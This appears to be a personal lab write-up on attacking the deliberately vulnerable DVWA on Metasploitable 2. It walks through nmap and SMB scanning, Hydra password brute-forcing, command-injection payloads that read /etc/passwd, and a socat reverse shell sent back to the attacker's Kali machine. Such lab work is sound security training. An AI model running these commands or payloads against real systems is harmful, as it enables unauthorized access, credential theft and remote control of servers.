<h1>DVWA web applications hacking</h1>
<p>Damn Vulnerable Web Application, shorter DVWA, is a PHP/MySQL web application that is damn vulnerable. The main goal of this pentesting playground is to aid penetration testers and security professionals 
  to test their skills and tools. In addition it can aid web devs better understand how to secure web apps, but also to aid students/teachers to learn all about web app security and possible vulnerabilities.</p>
<h2>Metasploitable</h2>
<p>DVWA is available on the <a target=_blank href=https://docs.rapid7.com/metasploit/metasploitable-2/>Metasploitable 2 system</a>. In my case, the IP address of Metasploitable 2 is 192.168.1.69.</p>
<h2>Scanning</h2>
<p><ol>
  <ul>nmap -T4 -A -v 192.168.1.69</ul>
</ol></p>
<p>Interesting information:</p>
<p><ol>
  <ul>port 21: open - service vsftpd 2.3.4</ul>
  <ul>anonymous FTP login allowed - logged in as ftp</ul>
  <ul>port 22: open - service openSSH 4.7p1</ul>
  <ul>port 23: telnet</ul>
  <ul>port 25: open - service Postfix smtpd</ul>
  <ul>port 53: open - service ISC Bind 9.4.2</ul>
  <ul>port 111: open</ul>
  <ul>port 139: open</ul>
  <ul>port 445: open</ul>
  <ul>port 1099: open - sevice java-rmi GNU Classpath grmiregistry</ul>
</ol></p>
<p>and more ....</p>

<h2>SMB enumeration</h2>
<p>I learned that SMB enumeration is one of the first steps to do:</p>
<p><ol>
  <ul>nmap -sV -T4 --script *smb* 192.168.1.69</ul>
</ol></p>
<h2>Shares</h2>
<p><ol>

<h1>Brute Force</h1>
<p>Modern brute force attacks can now easily crack 8-characters alphanumeric password in just a mere 2 hours, while more advanced encryption hashes can be cracked in a few months. This can be achieved by 
 performing exhaustive key search, in which the computer will try every possible combination of every single possible character in order to find the right combination of characters as the password. 
 For the purpose of this demonstration, I will be setting up the Damn Vulnerable Web Application (DVWA) to simulate a brute force attack.</p>
<p>Open a Burp Suite browser and direct it to the DVWA page, which will look exactly like the one on a regular browser. Now, try logging in using a random password. For this attempt, the username “admin” and 
 password “admin123” was used. For Burp Suite to scan the web application, <b>turn on the Intercept mode right before clicking on the “Login” button</b>. Using Burp Suite we have gathered information that 
may be useful (session cookies, parameters of the request etc.)</p>
<p>The next step is to use Hydra to crack the account password:</p>
<p><ol>
 <ul>hydra 192.168.1.69 -l admin -P /usr/share/wordlists/rockyou.txt http-get-form "/dvwa/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=XXXX;security=low:F=Username and/or 
  password incorrect"</ul>
 <ul>The result of the attack reveals the password to be "password", which will show that the login is succesful</ul>
</ol></p>
<h1>Command Execution</h1>
<p>Command Execution refers to the unauthorized ability to run arbitrary commands on a target system. This type of attack occurs when an attacker is able to execute commands on a server or machine, 
 often with elevated privileges, allowing them to manipulate, steal, or delete data, install malware, or perform other malicious activities. Command Execution or Command injection is an attack in 
 which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied 
 data (forms, cookies, HTTP headers etc.) to a system shell.</p>
<p>In DVWA Command Execution is possible in a form field in which we can enter an IP address to ping. However, we can add additional code directly after the IP address:</p>
<p><ol>
 <ul>8.8.8.8;ls -al</ul>
 <ul>8.8.8.8;cat /etc/passwd</ul>
 <ul>|| cat /etc/passwd</ul>
</ol></p>
<h2>Reverse shell with Socat</h2>
<p>Socat is useful for connecting applications inside separate boxes. Imagine we have Box A and Box B, and inside Box A, there’s a database server application running. 
 Furthermore, Box A is closed to the public, but Box B is open. Our network will allow a connection from Box B to Box A. Socat can connect in both directions. The user in Box B might want to send 
some database queries to the database server application in Box A. Then, the database server application could send the result back to the user in Box B.</p>
<p><ol>
 <ul>In Kali: create a TCP listener. In this case we use port 1337 but you can use a different port if needed:</ul>
<ul>socat file:`tty`,raw,echo=0 tcp-listen:1337</ul>
<ul>on the victim server, we want to connect to that port</ul> 
 <ul>8.8.8.8; socat tcp-connect:[IP address of Kali] exec:bash,pty,stderr,setsid,sigint</ul>
 <ul>at this point, our connection should be established in the terminal windows where we created the TCP listener and we are now in the server</ul>
</ol></p>
